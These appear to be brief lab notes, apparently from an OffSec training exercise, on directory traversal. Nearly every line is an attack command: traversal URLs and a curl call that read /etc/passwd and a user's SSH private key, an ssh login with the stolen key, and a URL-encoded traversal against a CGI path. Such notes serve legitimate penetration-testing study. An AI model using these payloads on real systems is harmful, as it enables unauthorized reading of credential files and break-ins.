
Without encoding

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

## Change the name of id_rsa and give (chmod 400)

```
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

# By encoding

```
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
